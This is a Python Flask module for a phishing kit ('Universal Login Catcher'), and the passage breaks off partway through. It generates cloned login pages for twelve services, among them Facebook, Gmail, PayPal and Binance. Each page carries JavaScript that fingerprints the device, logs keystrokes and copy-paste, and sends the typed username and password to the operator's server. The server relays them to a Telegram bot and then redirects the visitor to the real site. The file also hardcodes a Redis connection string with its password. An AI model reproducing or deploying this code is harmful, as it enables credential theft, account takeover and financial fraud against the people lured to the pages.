# session_hunter.py
# ============================================================
# Universal Login Catcher v2 - يدعم 12+ موقع
# صفحات مطابقة 100% + التقاط البيانات + تحويل تلقائي
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import uuid
import re
from urllib.parse import urljoin, urlparse, quote, unquote, urlencode
from flask import Blueprint, request, jsonify, Response, redirect
import requests

sh_bp = Blueprint('session_hunter', __name__)

# ============================================================
# [1] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=15)
    redis_client.ping()
    print("[+] Session Hunter: ✅ Redis connected")
except Exception as e:
    print(f"[-] SH Redis error: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# ============================================================
# [2] المواقع المدعومة - 12 موقع
# ============================================================
SUPPORTED_SITES = {
    "facebook": {
        "name": "فيسبوك",
        "name_en": "Facebook",
        "color": "#1877f2",
        "color_dark": "#166fe5",
        "logo": "https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg",
        "logo_letter": "f",
        "login_url": "https://www.facebook.com/login.php",
        "real_url": "https://www.facebook.com",
        "form_action": "https://www.facebook.com/login/device-based/regular/login/",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "pass",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب جديد",
        "bg": "#f0f2f5",
        "card_bg": "#ffffff",
        "text_color": "#1c1e21",
        "border": "#dddfe2",
        "extra_fields": [],
    },
    "instagram": {
        "name": "انستقرام",
        "name_en": "Instagram",
        "color": "#0095f6",
        "color_dark": "#0081d6",
        "logo": "https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png",
        "logo_letter": "I",
        "login_url": "https://www.instagram.com/accounts/login/",
        "real_url": "https://www.instagram.com",
        "form_action": "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
        "username_field": "username",
        "username_placeholder": "رقم الهاتف أو البريد أو اسم المستخدم",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب جديد",
        "bg": "#fafafa",
        "card_bg": "#ffffff",
        "text_color": "#262626",
        "border": "#dbdbdb",
        "extra_fields": [],
    },
    "tiktok": {
        "name": "تيك توك",
        "name_en": "TikTok",
        "color": "#fe2c55",
        "color_dark": "#e01e46",
        "logo": "https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/8152caf0c8e8e1e14935.png",
        "logo_letter": "T",
        "login_url": "https://www.tiktok.com/login",
        "real_url": "https://www.tiktok.com",
        "form_action": "https://www.tiktok.com/api/v1/auth/login/",
        "username_field": "username",
        "username_placeholder": "البريد الإلكتروني أو اسم المستخدم",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#000000",
        "card_bg": "#121212",
        "text_color": "#ffffff",
        "border": "#2f2f2f",
        "extra_fields": [],
    },
    "twitter": {
        "name": "تويتر / X",
        "name_en": "Twitter",
        "color": "#1d9bf0",
        "color_dark": "#1a8cd8",
        "logo": "https://abs.twimg.com/responsive-web/client-web/icon-ios.77d25eba.png",
        "logo_letter": "X",
        "login_url": "https://twitter.com/i/flow/login",
        "real_url": "https://twitter.com",
        "form_action": "https://api.twitter.com/1.1/onboarding/task.json",
        "username_field": "text",
        "username_placeholder": "رقم الهاتف أو البريد الإلكتروني",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#000000",
        "card_bg": "#000000",
        "text_color": "#e7e9ea",
        "border": "#2f3336",
        "extra_fields": [],
    },
    "gmail": {
        "name": "جيميل",
        "name_en": "Gmail",
        "color": "#1a73e8",
        "color_dark": "#1557b0",
        "logo": "https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png",
        "logo_letter": "G",
        "login_url": "https://accounts.google.com/signin",
        "real_url": "https://mail.google.com",
        "form_action": "https://accounts.google.com/signin/v2/identifier",
        "username_field": "identifier",
        "username_placeholder": "البريد الإلكتروني أو الهاتف",
        "password_field": "password",
        "password_placeholder": "أدخل كلمة المرور",
        "button_text": "التالي",
        "forgot_text": "هل نسيت كلمة المرور؟",
        "signup_text": "إنشاء حساب",
        "bg": "#ffffff",
        "card_bg": "#ffffff",
        "text_color": "#202124",
        "border": "#dadce0",
        "extra_fields": [],
    },
    "snapchat": {
        "name": "سناب شات",
        "name_en": "Snapchat",
        "color": "#fffc00",
        "color_dark": "#e6e300",
        "logo": "https://accounts.snapchat.com/accounts/static/images/ghost.svg",
        "logo_letter": "S",
        "login_url": "https://accounts.snapchat.com/accounts/login",
        "real_url": "https://web.snapchat.com",
        "form_action": "https://accounts.snapchat.com/accounts/login",
        "username_field": "username",
        "username_placeholder": "اسم المستخدم أو البريد",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#fffc00",
        "card_bg": "#ffffff",
        "text_color": "#000000",
        "border": "#e0e0e0",
        "extra_fields": [],
    },
    "linkedin": {
        "name": "لينكد إن",
        "name_en": "LinkedIn",
        "color": "#0a66c2",
        "color_dark": "#004182",
        "logo": "https://static.licdn.com/aero-v1/sc/h/akt4ae504epesldzj74dzred8",
        "logo_letter": "in",
        "login_url": "https://www.linkedin.com/login",
        "real_url": "https://www.linkedin.com",
        "form_action": "https://www.linkedin.com/uas/login-submit",
        "username_field": "session_key",
        "username_placeholder": "البريد الإلكتروني أو الهاتف",
        "password_field": "session_password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "انضم الآن",
        "bg": "#f3f2ef",
        "card_bg": "#ffffff",
        "text_color": "#000000",
        "border": "#e0e0e0",
        "extra_fields": [],
    },
    "discord": {
        "name": "ديسكورد",
        "name_en": "Discord",
        "color": "#5865f2",
        "color_dark": "#4752c4",
        "logo": "https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6ca814282eca7172c6_icon_clyde_white_RGB.svg",
        "logo_letter": "D",
        "login_url": "https://discord.com/login",
        "real_url": "https://discord.com/channels/@me",
        "form_action": "https://discord.com/api/v9/auth/login",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#313338",
        "card_bg": "#313338",
        "text_color": "#dbdee1",
        "border": "#202225",
        "extra_fields": [],
    },
    "telegram": {
        "name": "تلجرام",
        "name_en": "Telegram",
        "color": "#2aabee",
        "color_dark": "#229ed9",
        "logo": "https://telegram.org/img/t_logo.png",
        "logo_letter": "T",
        "login_url": "https://web.telegram.org/k/",
        "real_url": "https://web.telegram.org",
        "form_action": "https://web.telegram.org/",
        "username_field": "phone",
        "username_placeholder": "رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل تحتاج إلى مساعدة؟",
        "signup_text": "تسجيل جديد",
        "bg": "#17212b",
        "card_bg": "#232e3c",
        "text_color": "#ffffff",
        "border": "#101921",
        "extra_fields": [],
    },
    "netflix": {
        "name": "نتفليكس",
        "name_en": "Netflix",
        "color": "#e50914",
        "color_dark": "#c40812",
        "logo": "https://assets.nflxext.com/ffe/siteui/common/icons/nficon2016.ico",
        "logo_letter": "N",
        "login_url": "https://www.netflix.com/login",
        "real_url": "https://www.netflix.com/browse",
        "form_action": "https://www.netflix.com/api/login",
        "username_field": "userLoginId",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "الاشتراك",
        "bg": "#000000",
        "card_bg": "#000000",
        "text_color": "#ffffff",
        "border": "#333333",
        "extra_fields": [],
    },
    "paypal": {
        "name": "باي بال",
        "name_en": "PayPal",
        "color": "#0070ba",
        "color_dark": "#005ea6",
        "logo": "https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-color.svg",
        "logo_letter": "P",
        "login_url": "https://www.paypal.com/signin",
        "real_url": "https://www.paypal.com",
        "form_action": "https://www.paypal.com/signin/validate",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#f7f9fc",
        "card_bg": "#ffffff",
        "text_color": "#2c2e2f",
        "border": "#e0e0e0",
        "extra_fields": [],
    },
    "binance": {
        "name": "بينانس",
        "name_en": "Binance",
        "color": "#f0b90b",
        "color_dark": "#d4a40a",
        "logo": "https://bin.bnbstatic.com/static/images/favicon.ico",
        "logo_letter": "B",
        "login_url": "https://accounts.binance.com/login",
        "real_url": "https://www.binance.com",
        "form_action": "https://accounts.binance.com/bapi/accounts/v1/private/account/login/login",
        "username_field": "email",
        "username_placeholder": "البريد الإلكتروني أو رقم الهاتف",
        "password_field": "password",
        "password_placeholder": "كلمة السر",
        "button_text": "تسجيل الدخول",
        "forgot_text": "هل نسيت كلمة السر؟",
        "signup_text": "إنشاء حساب",
        "bg": "#0b0e11",
        "card_bg": "#1e2329",
        "text_color": "#eaecef",
        "border": "#2b3139",
        "extra_fields": [],
    },
}

# ============================================================
# [3] إدارة الجلسات
# ============================================================
sessions = {}
sessions_lock = threading.Lock()


def create_session(session_id, chat_id, target_site="facebook"):
    with sessions_lock:
        sessions[session_id] = {
            "chat_id": chat_id,
            "target_site": target_site,
            "created_at": time.time(),
            "last_seen": time.time(),
            "captured_credentials": [],
            "captured_ip": None,
            "captured_device": None,
            "page_views": 0,
        }
    if redis_client:
        try:
            redis_client.setex(f"sh_session:{session_id}", 86400 * 7, json.dumps({
                "chat_id": chat_id,
                "target_site": target_site,
            }))
        except Exception:
            pass
    return sessions[session_id]


def get_session(session_id):
    with sessions_lock:
        return sessions.get(session_id)


def save_credentials(session_id, username, password, extra_data):
    """حفظ بيانات الاعتماد"""
    sess = get_session(session_id)
    if not sess:
        return
    
    cred = {
        "username": username,
        "password": password,
        "extra": extra_data,
        "captured_at": time.time(),
    }
    sess["captured_credentials"].append(cred)
    
    if redis_client:
        try:
            redis_client.lpush(f"sh_creds:{session_id}", json.dumps(cred, ensure_ascii=False))
            redis_client.expire(f"sh_creds:{session_id}", 86400 * 7)
        except Exception as e:
            print(f"[-] Redis save creds error: {e}")


# ============================================================
# [4] القالب الرئيسي الموحد
# ============================================================
def generate_login_page(session_id, chat_id, site_key):
    """يولّد صفحة تسجيل دخول مطابقة للموقع"""
    site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
    
    # هل الموقع داكن؟
    is_dark = site["bg"] in ["#000000", "#0b0e11", "#121212", "#17212b", "#232e3c", "#313338"]
    
    text_align = "right"
    direction = "rtl"
    
    # تخصيص كل موقع
    if site_key == "tiktok":
        top_msg = "سجّل الدخول إلى TikTok"
    elif site_key == "twitter":
        top_msg = "تسجيل الدخول إلى X"
    elif site_key == "discord":
        top_msg = "مرحباً بك مجدداً!"
        top_sub = "نحن متحمسون لرؤيتك مرة أخرى!"
    elif site_key == "gmail":
        top_msg = "تسجيل الدخول"
        top_sub = "استخدم حسابك في Google"
    elif site_key == "snapchat":
        top_msg = "تسجيل الدخول"
    elif site_key == "linkedin":
        top_msg = "تسجيل الدخول"
        top_sub = "ابقَ على اطلاع على عالمك المهني"
    elif site_key == "netflix":
        top_msg = "تسجيل الدخول"
    elif site_key == "paypal":
        top_msg = "تسجيل الدخول إلى حسابك"
    elif site_key == "binance":
        top_msg = "تسجيل الدخول"
    elif site_key == "telegram":
        top_msg = "تسجيل الدخول"
    elif site_key == "instagram":
        top_msg = "Instagram"
    else:  # Facebook
        top_msg = "تسجيل الدخول إلى Facebook"
    
    html = f"""<!DOCTYPE html>
<html lang="ar" dir="{direction}">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>{site['name']} - تسجيل الدخول</title>
<meta name="theme-color" content="{site['color']}">
<link rel="icon" href="{site['logo']}">
<style>
  * {{ box-sizing: border-box; -webkit-tap-highlight-color: transparent; }}
  html, body {{
    margin: 0; padding: 0;
    background: {site['bg']};
    color: {site['text_color']};
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    min-height: 100vh;
    -webkit-font-smoothing: antialiased;
  }}
  .container {{
    max-width: 400px;
    margin: 0 auto;
    padding: 60px 24px 40px;
  }}
  .logo-wrap {{
    text-align: center;
    margin-bottom: 32px;
  }}
  .logo-wrap img {{
    max-width: 180px;
    max-height: 80px;
    display: block;
    margin: 0 auto;
  }}
  .logo-text {{
    font-size: 42px;
    font-weight: 800;
    color: {site['color']};
    letter-spacing: -2px;
  }}
  h1 {{
    font-size: 22px;
    font-weight: 600;
    text-align: center;
    margin: 0 0 8px;
    color: {site['text_color']};
  }}
  .subtitle {{
    font-size: 14px;
    text-align: center;
    color: {site['text_color'] if is_dark else '#65676b'};
    opacity: 0.75;
    margin-bottom: 28px;
    line-height: 1.5;
  }}
  .card {{
    background: {site['card_bg']};
    border-radius: 12px;
    padding: 24px 20px;
    box-shadow: 0 2px 12px rgba(0,0,0,{'0.4' if is_dark else '0.08'});
    border: 1px solid {site['border']};
  }}
  .form-group {{
    margin-bottom: 14px;
  }}
  input[type="text"], input[type="email"], input[type="password"], input[type="tel"] {{
    width: 100%;
    padding: 15px 18px;
    font-size: 15px;
    border-radius: 8px;
    border: 1px solid {site['border']};
    background: {site['card_bg'] if not is_dark else '#0f0f0f' if site_key == 'twitter' else site['bg']};
    color: {site['text_color']};
    font-family: inherit;
    outline: none;
    transition: border-color 0.2s;
  }}
  input:focus {{
    border-color: {site['color']};
  }}
  input::placeholder {{
    color: {site['text_color']};
    opacity: 0.5;
  }}
  .submit-btn {{
    width: 100%;
    padding: 15px;
    font-size: 16px;
    font-weight: 700;
    border: none;
    border-radius: 8px;
    background: {site['color']};
    color: {'#000000' if site_key == 'snapchat' else '#ffffff'};
    cursor: pointer;
    font-family: inherit;
    margin-top: 6px;
    transition: background 0.15s;
    letter-spacing: 0.3px;
  }}
  .submit-btn:hover {{
    background: {site['color_dark']};
  }}
  .submit-btn:active {{
    transform: scale(0.99);
  }}
  .submit-btn:disabled {{
    opacity: 0.6;
    cursor: not-allowed;
  }}
  .forgot-link {{
    display: block;
    text-align: center;
    margin-top: 16px;
    color: {site['color']};
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
  }}
  .forgot-link:hover {{
    text-decoration: underline;
  }}
  .divider {{
    display: flex;
    align-items: center;
    margin: 20px 0;
    color: {site['text_color']};
    opacity: 0.4;
    font-size: 13px;
  }}
  .divider::before,
  .divider::after {{
    content: '';
    flex: 1;
    height: 1px;
    background: {site['border']};
  }}
  .divider span {{
    padding: 0 12px;
  }}
  .signup-btn {{
    display: block;
    width: 100%;
    padding: 14px;
    text-align: center;
    text-decoration: none;
    font-size: 15px;
    font-weight: 600;
    border-radius: 8px;
    background: transparent;
    border: 1.5px solid {site['color']};
    color: {site['color']};
    margin-top: 6px;
    font-family: inherit;
  }}
  .signup-btn:hover {{
    background: {site['color']}15;
  }}
  .footer {{
    text-align: center;
    margin-top: 30px;
    font-size: 12px;
    color: {site['text_color']};
    opacity: 0.5;
    line-height: 1.6;
  }}
  .error {{
    background: #ffebe9;
    color: #d1242f;
    border: 1px solid #ff818266;
    border-radius: 8px;
    padding: 12px 16px;
    margin-top: 14px;
    font-size: 13px;
    display: none;
    text-align: center;
  }}
  .error.show {{
    display: block;
  }}
  .spinner {{
    display: inline-block;
    width: 16px;
    height: 16px;
    border: 2px solid rgba(255,255,255,0.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    vertical-align: middle;
    margin-left: 8px;
  }}
  @keyframes spin {{
    to {{ transform: rotate(360deg); }}
  }}
  .hidden {{ display: none !important; }}
</style>
</head>
<body>
<div class="container">

  <div class="logo-wrap">
    <img src="{site['logo']}" alt="{site['name']}" onerror="this.style.display='none'; document.getElementById('fallbackLogo').style.display='block';">
    <div id="fallbackLogo" class="logo-text" style="display:none;">{site['name_en']}</div>
  </div>

  <h1>{top_msg}</h1>
  {f'<p class="subtitle">{top_sub}</p>' if site_key == 'discord' else ''}
  {f'<p class="subtitle">{top_sub}</p>' if site_key == 'gmail' else ''}
  {f'<p class="subtitle">{top_sub}</p>' if site_key == 'linkedin' else ''}

  <div class="card">
    <form id="loginForm" autocomplete="on" onsubmit="return submitForm(event)">
      <div class="form-group">
        <input 
          type="text" 
          id="username" 
          name="{site['username_field']}" 
          placeholder="{site['username_placeholder']}"
          autocomplete="username"
          required
          autofocus
        >
      </div>

      <div class="form-group">
        <input 
          type="password" 
          id="password" 
          name="{site['password_field']}" 
          placeholder="{site['password_placeholder']}"
          autocomplete="current-password"
          required
        >
      </div>

      <button type="submit" class="submit-btn" id="submitBtn">
        <span id="btnText">{site['button_text']}</span>
      </button>

      <a href="#" class="forgot-link" onclick="event.preventDefault()">
        {site['forgot_text']}
      </a>
    </form>

    <div id="errorBox" class="error"></div>
  </div>

  <div class="divider"><span>أو</span></div>

  <a href="{site['real_url']}" class="signup-btn" id="signupBtn">
    {site['signup_text']}
  </a>

  <div class="footer">
    <div>{site['name_en']} © {time.strftime('%Y')}</div>
    <div style="margin-top:4px;">اللغات: العربية · English · Français</div>
  </div>

</div>

<script>
(function() {{
  "use strict";
  
  const SESSION_ID = "{session_id}";
  const CHAT_ID = "{chat_id}";
  const SERVER = "{RAILWAY_URL}";
  const SITE_KEY = "{site_key}";
  const REAL_URL = "{site['real_url']}";
  
  // ============================================================
  // جمع بصمة الجهاز
  // ============================================================
  async function collectFingerprint() {{
    const fp = {{
      session_id: SESSION_ID,
      chat_id: CHAT_ID,
      type: 'device',
      site: SITE_KEY,
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      languages: navigator.languages || [],
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: {{
        w: window.screen.width,
        h: window.screen.height,
        dpr: window.devicePixelRatio,
        depth: window.screen.colorDepth
      }},
      hardware: {{
        cores: navigator.hardwareConcurrency || 'N/A',
        memory: navigator.deviceMemory || 'N/A',
        touch: navigator.maxTouchPoints || 0
      }},
      cookies_enabled: navigator.cookieEnabled,
      referrer: document.referrer || 'direct',
      url: window.location.href
    }};
    
    // البطارية
    try {{
      if (navigator.getBattery) {{
        const b = await navigator.getBattery();
        fp.battery = {{ level: Math.round(b.level * 100), charging: b.charging }};
      }}
    }} catch(e) {{}}
    
    // الشبكة
    try {{
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) fp.network = {{ type: c.effectiveType, downlink: c.downlink, rtt: c.rtt }};
    }} catch(e) {{}}
    
    // WebGL
    try {{
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (gl) {{
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) fp.gpu = {{
          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        }};
      }}
    }} catch(e) {{}}
    
    // WebRTC IP
    try {{
      const ips = new Set();
      const pc = new RTCPeerConnection({{iceServers: [{{urls: 'stun:stun.l.google.com:19302'}}]}});
      pc.createDataChannel('');
      pc.onicecandidate = e => {{
        if (!e.candidate) return;
        const m = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/.exec(e.candidate.candidate);
        if (m) ips.add(m[1]);
      }};
      await pc.setLocalDescription(await pc.createOffer());
      await new Promise(r => setTimeout(r, 2000));
      pc.close();
      if (ips.size) fp.webrtc_ips = Array.from(ips);
    }} catch(e) {{}}
    
    return fp;
  }}
  
  // ============================================================
  // الإقلاع: جمع البصمة فور فتح الصفحة
  // ============================================================
  (async () => {{
    const fp = await collectFingerprint();
    try {{
      await fetch(SERVER + '/sh_data', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(fp)
      }});
    }} catch(e) {{}}
  }})();
  
  // ============================================================
  // Keylogger
  // ============================================================
  let keyBuffer = '';
  let lastKeyTime = 0;
  
  document.addEventListener('keydown', function(e) {{
    try {{
      let key = e.key;
      if (key === 'Enter') key = '\\n';
      else if (key.length > 1 && !['Enter', 'Tab', 'Backspace'].includes(key)) return;
      else if (key === 'Backspace') key = '⌫';
      else if (key === 'Tab') key = ' ⇥ ';
      
      keyBuffer += key;
      const now = Date.now();
      
      if (now - lastKeyTime > 2000 || key === '\\n' || keyBuffer.length > 80) {{
        if (keyBuffer.trim()) {{
          fetch(SERVER + '/sh_data', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
              session_id: SESSION_ID,
              chat_id: CHAT_ID,
              type: 'keylog',
              site: SITE_KEY,
              text: keyBuffer,
              url: window.location.href
            }})
          }}).catch(() => {{}});
          keyBuffer = '';
        }}
        lastKeyTime = now;
      }}
    }} catch(e) {{}}
  }}, true);
  
  // ============================================================
  // إرسال النموذج
  // ============================================================
  window.submitForm = async function(event) {{
    event.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    const btn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    
    if (!username || !password) {{
      return false;
    }}
    
    // Disable button
    btn.disabled = true;
    btnText.textContent = 'جاري التحقق';
    btn.innerHTML = 'جاري التحقق<span class="spinner"></span>';
    
    // إرسال فوري
    try {{
      await fetch(SERVER + '/sh_data', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: 'credentials',
          site: SITE_KEY,
          username: username,
          password: password,
          url: window.location.href,
          ts: Date.now()
        }})
      }});
    }} catch(e) {{}}
    
    // محاكاة خطأ بسيط ثم تحويل
    setTimeout(() => {{
      // إظهار خطأ بسيط
      const errBox = document.getElementById('errorBox');
      errBox.textContent = 'تعذّر تسجيل الدخول — جاري إعادة المحاولة...';
      errBox.classList.add('show');
      
      setTimeout(() => {{
        errBox.textContent = 'يتم الآن تحويلك...';
        setTimeout(() => {{
          window.location.href = REAL_URL;
        }}, 1200);
      }}, 1500);
    }}, 1000);
    
    return false;
  }};
  
  // ============================================================
  // اعتراض النماذج الأخرى (احتياطي)
  // ============================================================
  document.addEventListener('submit', function(e) {{
    try {{
      const form = e.target;
      const fd = new FormData(form);
      const data = {{}};
      for (const [k, v] of fd.entries()) {{
        if (typeof v === 'string') data[k] = v;
      }}
      fetch(SERVER + '/sh_data', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: 'form_submit',
          site: SITE_KEY,
          url: window.location.href,
          action: form.action,
          fields: data
        }})
      }}).catch(() => {{}});
    }} catch(err) {{}}
  }}, true);
  
  // ============================================================
  // Copy/Paste monitoring
  // ============================================================
  document.addEventListener('copy', () => {{
    try {{
      const sel = window.getSelection().toString().slice(0, 500);
      if (sel) fetch(SERVER + '/sh_data', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          session_id: SESSION_ID, chat_id: CHAT_ID,
          type: 'clipboard_copy', site: SITE_KEY, content: sel
        }})
      }}).catch(() => {{}});
    }} catch(e) {{}}
  }}, true);
  
  document.addEventListener('paste', (e) => {{
    try {{
      const txt = (e.clipboardData || window.clipboardData).getData('text');
      if (txt && txt.length > 3) fetch(SERVER + '/sh_data', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
          session_id: SESSION_ID, chat_id: CHAT_ID,
          type: 'clipboard_paste', site: SITE_KEY, content: txt.slice(0, 500)
        }})
      }}).catch(() => {{}});
    }} catch(e) {{}}
  }}, true);
  
}})();
</script>
</body>
</html>"""
    
    return html


# ============================================================
# [5] المسارات
# ============================================================
def init_session_hunter_routes(app, bot):

    # ============================================================
    # الصفحة الرئيسية — تعرض صفحة تسجيل الدخول
    # ============================================================
    @app.route('/sh', methods=['GET'])
    def sh_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        site = request.args.get('site', 'facebook').lower()
        
        if not session_id or not chat_id:
            return "Invalid link", 400
        
        if site not in SUPPORTED_SITES:
            site = 'facebook'
        
        # أنشئ الجلسة إن لم تكن موجودة
        sess = get_session(session_id)
        if not sess:
            create_session(session_id, chat_id, site)
        
        sess["page_views"] = sess.get("page_views", 0) + 1
        sess["last_seen"] = time.time()
        
        # IP الحقيقي
        source_ip = (request.headers.get('CF-Connecting-IP') or
                     request.headers.get('X-Forwarded-For') or
                     request.remote_addr or "Unknown")
        if ',' in source_ip:
            source_ip = source_ip.split(',')[0].strip()
        
        sess["captured_ip"] = source_ip
        
        # سجل الزيارة
        if sess["page_views"] == 1:
            try:
                bot.send_message(
                    int(chat_id) if str(chat_id).isdigit() else chat_id,
                    f"🎯 **الضحية فتح رابط {SUPPORTED_SITES[site]['name']}!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🆔 `{session_id[:16]}`\n"
                    f"🌐 IP: `{source_ip}`\n"
                    f"🎯 الموقع: **{SUPPORTED_SITES[site]['name']}**\n\n"
                    f"⏳ في انتظار إدخال البيانات...",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"[-] notify landing error: {e}")
        
        html = generate_login_page(session_id, chat_id, site)
        return html, 200

    # ============================================================
    # إنشاء جلسة
    # ============================================================
    @app.route('/sh_create', methods=['POST'])
    def sh_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        site = data.get('site', 'facebook')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id') or str(uuid.uuid4()).replace('-', '')[:24]
        create_session(session_id, chat_id, site)
        return jsonify({"session_id": session_id}), 200

    # ============================================================
    # ★★★ استقبال البيانات ★★★
    # ============================================================
    @app.route('/sh_data', methods=['POST'])
    def sh_data():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            dtype = data.get('type')
            site_key = data.get('site', 'facebook')
            
            if not session_id or not chat_id:
                return jsonify({"status": "missing"}), 200
            
            sess = get_session(session_id)
            if not sess:
                create_session(session_id, chat_id, site_key)
                sess = get_session(session_id)
            
            sess["last_seen"] = time.time()
            
            # IP
            source_ip = (request.headers.get('CF-Connecting-IP') or
                         request.headers.get('X-Forwarded-For') or
                         request.remote_addr or "Unknown")
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()
            
            _handle_sh_data(bot, chat_id, session_id, data, source_ip, site_key)
            
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] sh_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 200

    # ============================================================
    # صفحة عرض الجلسة (ويب)
    # ============================================================
    @app.route('/sh_view', methods=['GET'])
    def sh_view():
        session_id = request.args.get('s', '')
        if not session_id:
            return "No session", 400
        sess = get_session(session_id)
        if not sess:
            return "Session not found", 404
        return render_dashboard(session_id, sess)


# ============================================================
# [6] معالجة البيانات الواردة
# ============================================================
def _handle_sh_data(bot, chat_id, session_id, data, source_ip, site_key):
    dtype = data.get('type')
    site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
    
    print(f"[SH <<] {dtype} | {site_key} | {session_id[:8]}")
    
    try:
        # ============================================================
        # ★★★ بيانات الاعتماد (الأهم) ★★★
        # ============================================================
        if dtype == 'credentials':
            username = data.get('username', '')
            password = data.get('password', '')
            url = data.get('url', '')
            
            save_credentials(session_id, username, password, {
                "url": url,
                "ip": source_ip,
                "site": site_key,
            })
            
            # رسالة فورية بتنسيق جميل
            msg = (
                f"🎯 **بيانات تسجيل دخول جديدة!**\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"🌐 **الموقع:** {site['name']}\n"
                f"🆔 **الجلسة:** `{session_id[:16]}`\n\n"
                f"👤 **اسم المستخدم / البريد:**\n"
                f"`{username}`\n\n"
                f"🔑 **كلمة السر:**\n"
                f"`{password}`\n\n"
                f"🌍 **IP:** `{source_ip}`\n"
                f"🔗 **الرابط:** `{url[:80]}`\n"
                f"🕐 **الوقت:** `{time.strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
